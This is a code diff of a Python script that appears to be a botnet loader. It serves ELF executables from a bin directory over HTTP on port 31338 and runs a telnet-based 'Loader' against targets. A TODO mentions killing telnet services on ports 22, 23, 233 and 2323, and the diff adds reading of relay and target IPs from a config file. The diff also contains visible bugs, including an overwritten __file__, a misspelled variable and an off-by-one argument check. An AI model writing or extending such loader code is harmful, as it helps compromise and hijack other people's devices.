@@ -1,18 +1,28 @@
 import telnetlib, sys, os, http.server, socketserver
-# TODO : Kill Telnet service on ports 22, 23, 233, 2323
-
-# modules
+import json
+'''TODO : Kill Telnet service on ports 22, 23, 233, 2323'''
 from libs import truecolors
 
 __bin__ = ""
-__webp_ = "31338"
+__webp_ = "31338"           # bin server port
+__file__="./ELF_file/"      # bin server port
+Host_IP = ""
+
+def read_config_ip():
+    filename = 'ip_config.ini'
+    with open(filename, 'r') as file:
+        json_data = json.load(file)
+    RelayIP = json_data['RelayIP']
+    targetIP = json_data['targetIP']
+    return RelayIP , targetIP
+
 
 
 def ServeHTTP():
-        web_dir = os.path.join(os.path.dirname(__file__), 'bin')
-        os.chdir(web_dir)
-        Handler = http.server.SimpleHTTPRequestHandler
-        httpd = socketserver.TCPServer(("", int(__webp_)), Handler)
+        web_dir = os.path.join(os.path.dirname(__file__), 'bin')    # 到bin資料夾下面抓出可執行檔
+        os.chdir(web_dir)                                           # 切換當前路徑到新路徑上
+        Handler = http.server.SimpleHTTPRequestHandler              # 提供HTTP請求服務
+        httpd = socketserver.TCPServer((Host_IP, int(__webp_)), Handler) # 掛載TCP服務
         truecolors.print_info("Webserver started any:"+ __webp_)
         httpd.serve_forever()
 
@@ -75,10 +85,12 @@ def ForceDB(fname):
         truecolors.print_errn("Operation interrupted.")
     except Exception as e:
         truecolors.print_errn("Loader: " + str(e))
-    
-if len(sys.argv) >= 2:
-    ServeHTTP()
-    ForceDB(sys.argv[2])
-else:
-    truecolors.print_errn("Error: Unrecognized arguments.")
-    sys.exit(1)
+
+if __name__ == '__main__':
+    if len(sys.argv) >= 2:
+        Host_IP , targerIP = read_config_ip()
+        ServeHTTP()
+        ForceDB(sys.argv[2])
+    else:
+        truecolors.print_errn("Error: Unrecognized arguments.")
+        sys.exit(1)
